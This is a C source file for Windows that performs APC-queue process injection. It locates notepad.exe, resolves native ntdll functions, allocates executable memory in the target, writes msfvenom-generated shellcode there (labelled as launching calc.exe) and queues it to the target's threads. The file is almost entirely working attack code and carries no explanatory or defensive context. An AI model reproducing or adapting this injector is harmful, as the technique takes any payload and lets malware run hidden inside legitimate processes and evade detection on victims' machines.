#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <Winbase.h>

#define TARGET_PROCESS_NAME "notepad.exe"


typedef struct _UNICODE_STRING
{
     USHORT Length;
     USHORT MaximumLength;
     _Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
 } UNICODE_STRING, * PUNICODE_STRING;

typedef struct _CLIENT_ID
{
     HANDLE UniqueProcess;
     HANDLE UniqueThread;
 } CLIENT_ID, * PCLIENT_ID;

typedef struct _OBJECT_ATTRIBUTES
{
     ULONG Length;
     HANDLE RootDirectory;
     PUNICODE_STRING ObjectName;
     ULONG Attributes;
     PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
     PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
 } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK
 {
	union
	{
		NTSTATUS Status;
		PVOID Pointer;
     };
     ULONG_PTR Information;
 } IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef VOID(NTAPI* PIO_APC_ROUTINE)(
	_In_ PVOID ApcContext,
	_In_ PIO_STATUS_BLOCK IoStatusBlock,
	_In_ ULONG Reserved);

#define InitializeObjectAttributes(p,n,a,r,s) { \
(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
(p)->RootDirectory = (r); \
(p)->Attributes = (a); \
(p)->ObjectName = (n); \
(p)->SecurityDescriptor = (s); \
(p)->SecurityQualityOfService = NULL; \
}

typedef NTSTATUS(WINAPI * pNtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten);
typedef NTSTATUS(WINAPI * pNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
typedef NTSTATUS(WINAPI * pNtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
typedef NTSTATUS(WINAPI * pNtOpenThread)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
typedef NTSTATUS(WINAPI * pNtQueueApcThread)(HANDLE ThreadHandle, PIO_APC_ROUTINE ApcRoutine, PVOID ApcRoutineContext, PIO_STATUS_BLOCK ApcStatusBlock , ULONG ApcReserved);



DWORD find_process(char* process_name) {

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	for (Process32First(snapshot, &pe);Process32Next(snapshot, &pe);) {
		if (strcmp(pe.szExeFile, process_name) == 0) {
			CloseHandle(snapshot);
			return pe.th32ProcessID;
		}
	}

	CloseHandle(snapshot);
	return 0;
}

//DWORD find_threads(DWORD process_id) {
//
//	THREADENTRY32 te;
//	te.dwSize = sizeof(THREADENTRY32);
//
//	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
//
//	for (Thread32First(snapshot, &te); Thread32Next(snapshot, &te);) {
//		if (te.th32OwnerProcessID == process_id) {
//
//
//		}
//	}
//
//	CloseHandle(snapshot);
//
//}


///msfvenom -p windows/x64/exec cmd=calc.exe -b '\x00\x0a\x0d' -f c
unsigned char shellcode[] =
"\xcc\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\xce\x18\x99\x11\x36\x97\xfd\x04\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x32\x50\x1a\xf5\xc6\x7f"
"\x3d\x04\xce\x18\xd8\x40\x77\xc7\xaf\x55\x98\x50\xa8\xc3\x53"
"\xdf\x76\x56\xae\x50\x12\x43\x2e\xdf\x76\x56\xee\x50\x12\x63"
"\x66\xdf\xf2\xb3\x84\x52\xd4\x20\xff\xdf\xcc\xc4\x62\x24\xf8"
"\x6d\x34\xbb\xdd\x45\x0f\xd1\x94\x50\x37\x56\x1f\xe9\x9c\x59"
"\xc8\x59\xbd\xc5\xdd\x8f\x8c\x24\xd1\x10\xe6\x1c\x7d\x8c\xce"
"\x18\x99\x59\xb3\x57\x89\x63\x86\x19\x49\x41\xbd\xdf\xe5\x40"
"\x45\x58\xb9\x58\x37\x47\x1e\x52\x86\xe7\x50\x50\xbd\xa3\x75"
"\x4c\xcf\xce\xd4\x20\xff\xdf\xcc\xc4\x62\x59\x58\xd8\x3b\xd6"
"\xfc\xc5\xf6\xf8\xec\xe0\x7a\x94\xb1\x20\xc6\x5d\xa0\xc0\x43"
"\x4f\xa5\x40\x45\x58\xbd\x58\x37\x47\x9b\x45\x45\x14\xd1\x55"
"\xbd\xd7\xe1\x4d\xcf\xc8\xd8\x9a\x32\x1f\xb5\x05\x1e\x59\xc1"
"\x50\x6e\xc9\xa4\x5e\x8f\x40\xd8\x48\x77\xcd\xb5\x87\x22\x38"
"\xd8\x43\xc9\x77\xa5\x45\x97\x42\xd1\x9a\x24\x7e\xaa\xfb\x31"
"\xe7\xc4\x58\x88\xe0\x8e\x36\x91\x2b\xab\x11\x36\xd6\xab\x4d"
"\x47\xfe\xd1\x90\xda\x37\xfc\x04\xce\x51\x10\xf4\x7f\x2b\xff"
"\x04\xdf\x44\x59\xb9\x37\xab\xbc\x50\x87\x91\x7d\x5d\xbf\x66"
"\xbc\xbe\x82\x6f\xbf\x16\xc9\x42\xb1\x8d\x24\x70\x98\x10\x36"
"\x97\xa4\x45\x74\x31\x19\x7a\x36\x68\x28\x54\x9e\x55\xa8\xd8"
"\x7b\xa6\x3d\x4c\x31\xd8\xd1\x98\xf4\xdf\x02\xc4\x86\x91\x58"
"\x50\x8c\x7d\xf2\xdb\x2e\xe7\x4c\x59\xbf\x50\x97\x14\x8f\x40"
"\xd5\x98\xd4\xdf\x74\xfd\x8f\xa2\x00\xb4\x42\xf6\x02\xd1\x86"
"\x99\x5d\x51\x34\x97\xfd\x4d\x76\x7b\xf4\x75\x36\x97\xfd\x04"
"\xce\x59\xc9\x50\x66\xdf\x74\xe6\x99\x4f\xce\x5c\x07\x57\x97"
"\x09\x97\x59\xc9\xf3\xca\xf1\x3a\x40\xea\x4c\x98\x10\x7e\x1a"
"\xb9\x20\xd6\xde\x99\x79\x7e\x1e\x1b\x52\x9e\x59\xc9\x50\x66"
"\xd6\xad\x4d\x31\xd8\xd8\x41\x7f\x68\x35\x49\x47\xd9\xd5\x98"
"\xf7\xd6\x47\x7d\x02\x27\x1f\xee\xe3\xdf\xcc\xd6\x86\xe7\x53"
"\x9a\x38\xd6\x47\x0c\x49\x05\xf9\xee\xe3\x2c\x0d\xb1\x6c\x4e"
"\xd8\xab\x90\x02\x40\x99\x31\xcd\xd1\x92\xf2\xbf\xc1\x02\xb2"
"\x12\x19\xea\xd6\xe2\xf8\xbf\x89\x0b\xeb\x7e\x5c\x97\xa4\x45"
"\x47\xc2\x66\xc4\x36\x97\xfd\x04";

int main() {

	HMODULE hNtdll = GetModuleHandle("ntdll.dll");

	pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	pNtOpenThread NtOpenThread = (pNtOpenThread)GetProcAddress(hNtdll, "NtOpenThread");
	pNtOpenProcess NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
	pNtQueueApcThread NtQueueApcThread = (pNtQueueApcThread)GetProcAddress(hNtdll, "NtQueueApcThread");


	DWORD target_process_id = find_process(TARGET_PROCESS_NAME);

	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, NULL, NULL, NULL, NULL);
	CLIENT_ID ci = { (HANDLE)target_process_id, NULL };

	HANDLE target_process_handle; 
	LPVOID target_process_buffer;
	unsigned int shellcode_len = sizeof(shellcode);


	NtOpenProcess(&target_process_handle, PROCESS_ALL_ACCESS, &oa, &ci);
	NtAllocateVirtualMemory(target_process_handle, &target_process_buffer,0, (PULONG)&shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	NtWriteVirtualMemory(target_process_handle, target_process_buffer, shellcode, shellcode_len, NULL);
	printf("target process id is %d\n", target_process_id);

	THREADENTRY32 te;
	te.dwSize = sizeof(THREADENTRY32);
	
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	HANDLE target_thread_handle;
	CLIENT_ID thread_client_id;

	for (Thread32First(snapshot, &te); Thread32Next(snapshot, &te);) {
		if (te.th32OwnerProcessID == target_process_id) {

			
			thread_client_id.UniqueProcess = (PVOID)target_process_id;
			thread_client_id.UniqueThread = (PVOID)te.th32ThreadID;
			NtOpenThread(&target_thread_handle, THREAD_ALL_ACCESS, &oa, &thread_client_id);
			
			if (NtQueueApcThread(target_thread_handle,(PAPCFUNC)target_process_buffer, target_process_buffer, NULL,NULL) == 0) {
				printf("adding to APC queue of thread id %d\n", te.th32ThreadID);
			}
			CloseHandle(target_thread_handle);
		}
	}

	CloseHandle(snapshot);


	
	CloseHandle(target_process_handle);

	return 0;
}
